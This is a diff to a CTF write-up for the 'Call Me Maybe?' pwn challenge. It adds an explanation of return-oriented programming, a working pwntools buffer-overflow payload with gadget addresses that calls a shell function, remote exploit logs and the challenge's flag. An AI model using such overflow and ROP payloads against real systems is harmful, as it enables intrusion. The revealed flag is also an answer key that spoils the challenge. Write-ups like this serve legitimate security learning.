@@ -237,9 +237,7 @@ Enter Contact => Calling AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Unauthorized.
 ```
 
-### Inserting the parameter on the stack
-
-Since we have the value of `rbp`, we can shape the stack and the contents on the stack.
+### Passing in the parameter
 
 Looking at the disassembly of the `shell` function, the value of `0xdeadbeef` should be stored in `rbp-0x14`.
 ```
@@ -333,6 +331,34 @@ Program received signal SIGSEGV, Segmentation fault.
 
 It doesn;t look like we can just overflow to the needed location on the stack, since the location is overwritten with `0xf7f9b4d0` for some reason. Looking at the disassembly again, this value is actually the register `rdi/edi`. Checking [here](https://web.stanford.edu/class/cs107/guide/x86-64.html), this is the register where the argument is located.
 
+### Research and My basic understanding of ROP
+
+There are many guides on return oriented progamming out there. A very good source of understanding the concept is through the Liveoverflow Binary Exploitation video series. More specifically [this](https://www.youtube.com/watch?v=8Dcj19KGKWM) and [this](https://www.youtube.com/watch?v=zaQVNM3or7k&t=88s).
+
+The basic concept is that once you buffer overflow to the Instruction pointer, you put the addresses of the functions, or ROP Gadgets(which is basically like useful sections of assembly code in binary). The computer then runs the corresponding code
+* The important thing is that all these functions end in a `ret` or a `jmp` or something similar, so you can chain the gadgets together to actually write some meaningful code
+
+The Payload should consist of something like this
+```
+Padding to reach the EIP
+Instruction pointer to gadget 1 (for example it is a nop instruction)
+Instruction pointer to gadget 2
+...
+```
+
+Sometimes some gadgets may allow you to inject some value into the register. For example, the `pop rdi; ret;` gadget takes a value from the stack and stores it in rdi i think. So you will put it in the payload like This
+```
+instruction pointer to gadget (pop rdi; ret)
+0xDEADBEEF
+instruction pointer to next gadget
+```
+
+You can get the instruction pointer to the functions/ gadgets by
+1. Disassemble the binary using objdump, and then find the address of the function OR
+2. Running [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
+
+### Using ROP
+
 Looking at the ROP gadgets, there may be an interesting gadget `0x0000000000400873`. On reading some writeups like [this](https://gist.github.com/winstonho90/8309a63c1b5bc71244dfefd4a2dda734), I realised that we can use this gadget to insert a value to rdi.
 
 ```
@@ -386,7 +412,7 @@ cat: /home/callmemaybe/flag.txt: No such file or directory
 
 ## Running on server
 
-Running this on the remote server does not get me a shell though so maybe there is something wrong?
+Running this on the remote server does not get me a shell though so maybe there is something wrong? I am not even sure if there is a segmentation fault since the error messages are not sent over netcat (I tried).
 
 ```
 terminals database is inaccessible
@@ -414,7 +440,103 @@ Enter Contact => Calling AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [*] Got EOF while reading in interactive
 ```
 
+Maybe there is something wrong with my payload?
+
+So far if I only call the shell function, and the `ret` ROP gadget at `0x000000000040055e` the code still functions like how it does locally on my computer.
+
+Payload Used:
+```
+contact = b"A"*64 # Padding for the variable contact
+padding = b"A"*8 # Bruteforce the requred extra padding before it doesn't crash
+
+## ROP Gadgets
+ropchain = b""
+ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x00000000004006ea) # shell()
+ropchain += p64(0x00000000004006ea) # shell()
+
+payload = contact + padding + ropchain
+```
+
+```
+terminals database is inaccessible
+Warning: _curses.error: setupterm: could not find terminfo database
+
+Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
+[x] Opening connection to 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg on port 30201
+[x] Opening connection to 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg on port 30201: Trying 134.209.101.182
+[+] Opening connection to 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg on port 30201: Done
+88
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^\x05@\x00\x00\x00\x00\x00\xea\x06@\x00\x00\x00\x00\x00'
+[*] Switching to interactive mode
+ _______  _     _  __    _  _______  __   __  _______  _______  ______   
+|       || | _ | ||  |  | ||       ||  | |  ||       ||       ||    _ |  
+|    _  || || || ||   |_| ||_     _||  | |  ||_     _||   _   ||   | ||  
+|   |_| ||       ||       |  |   |  |  |_|  |  |   |  |  | |  ||   |_||_
+|    ___||       ||  _    |  |   |  |       |  |   |  |  |_|  ||    __  |
+|   |    |   _   || | |   |  |   |  |       |  |   |  |       ||   |  | |
+|___|    |__| |__||_|  |__|  |___|  |_______|  |___|  |_______||___|  |_|
+
+=========================================================================
+                         Stage 3: Call Me Maybe?
+=========================================================================
+Enter Contact => Calling AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^@...
+Unauthorized.
+Unauthorized.
+[*] Got EOF while reading in interactive
+```
+
+After just tinkering with the payload for a while I got the Flag. The final code is in `solve.py`. My theory is that some padding is needed in the rop chain so that the ROPgadgets actually work properly on the stack (for example, the values aren't overriden or something idk I'm not an expert)
+
+Payload :
+
+```
+contact = b"A"*64 # Padding for the variable contact
+padding = b"A"*8 # Bruteforce the requred extra padding before it doesn't crash
+
+## ROP Gadgets
+ropchain = b""
+ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x00000000004006ea) # shell()
+ropchain += p64(0x0000000000400873) #pop rdi; ret
+ropchain += p64(0xDEADBEEF)
+ropchain += p64(0x00000000004006ea) # shell()
+
+payload = contact + padding + ropchain
+```
+
+Output:
+
+```
+terminals database is inaccessible
+Warning: _curses.error: setupterm: could not find terminfo database
+
+Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
+[x] Opening connection to 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg on port 30201
+[x] Opening connection to 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg on port 30201: Trying 134.209.101.215
+[+] Opening connection to 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg on port 30201: Done
+120
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^\x05@\x00\x00\x00\x00\x00^\x05@\x00\x00\x00\x00\x00\xea\x06@\x00\x00\x00\x00\x00s\x08@\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xea\x06@\x00\x00\x00\x00\x00'
+[*] Switching to interactive mode
+ _______  _     _  __    _  _______  __   __  _______  _______  ______   
+|       || | _ | ||  |  | ||       ||  | |  ||       ||       ||    _ |  
+|    _  || || || ||   |_| ||_     _||  | |  ||_     _||   _   ||   | ||  
+|   |_| ||       ||       |  |   |  |  |_|  |  |   |  |  | |  ||   |_||_
+|    ___||       ||  _    |  |   |  |       |  |   |  |  |_|  ||    __  |
+|   |    |   _   || | |   |  |   |  |       |  |   |  |       ||   |  | |
+|___|    |__| |__||_|  |__|  |___|  |_______|  |___|  |_______||___|  |_|
+
+=========================================================================
+                         Stage 3: Call Me Maybe?
+=========================================================================
+Enter Contact => Calling AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^@...
+Unauthorized.
+callmemaybe
+CTFSG{h3y_1_ju5t_m3t_y0u_but_1_g0t_sh3ll}
+```
 
 
 ## Flag
-``
+`CTFSG{h3y_1_ju5t_m3t_y0u_but_1_g0t_sh3ll}`
